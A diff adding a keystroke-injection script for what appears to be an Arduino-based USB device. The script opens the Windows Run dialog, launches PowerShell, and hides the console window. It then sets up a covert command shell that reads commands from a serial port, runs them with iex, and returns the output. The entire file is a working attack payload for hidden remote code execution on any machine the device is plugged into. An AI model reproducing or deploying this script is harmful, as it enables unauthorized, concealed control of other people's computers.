@@ -1,0 +1,93 @@
+dl-500
+
+ps-LEFT_GUI
+
+ps-r
+
+dl-250
+
+ra-
+
+dl-250
+
+pt-powershell
+
+dl-250
+
+ps-RETURN
+
+ra-
+
+dl-500
+pt-Add-Type -Name Window -Namespace Console -MemberDefinition '
+
+ps-RETURN
+
+ra-
+
+dl-50
+
+pt-[DllImport("Kernel32.dll")]
+
+ps-RETURN
+
+ra-
+
+dl-50
+pt-public static extern IntPtr GetConsoleWindow();
+
+ps-RETURN
+
+ra-
+
+dl-50
+pt-[DllImport("user32.dll")]
+
+ps-RETURN
+
+ra-
+
+dl-50
+pt-public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
+
+dl-50
+
+ps-RETURN
+
+ra-
+
+dl-50
+
+pt-function Hide-Console {$consolePtr = [Console.Window]::GetConsoleWindow();
+
+pt-[Console.Window]::ShowWindow($consolePtr, 0)};
+
+ps-RETURN
+
+ra-
+
+pt-$ports = Get-WMIObject Win32_SerialPort| Where-Object PNPDeviceID -eq "USB\VID_2341&PID_8057&MI_01\7&6159C51&0&0001"| Select-Object -ExpandProperty DeviceID;
+
+ps-RETURN
+
+ra-
+
+pt-$port= new-Object System.IO.Ports.SerialPort $ports,115200,None,8,one;
+pt-$port.Open();
+pt-while($port.IsOpen){;
+pt-$data = $port.ReadExisting();
+pt-$datareal = $datareal + $data;
+pt-if ($datareal -Match "<<ENDD>>") {;
+pt-$datareal = $datareal.Replace("<<ENDD>>","");
+pt-$sendback = (iex $datareal 2>&1 | Out-String );
+pt-$sendback2  = $sendback + "PS " + (pwd).Path + "> ";
+pt-$port.WriteLine("~"+$sendback2);
+pt-$datareal = "";
+pt-$data = ""};
+pt-Hide-Console};
+
+ps-RETURN
+
+ra-
+
+EOF
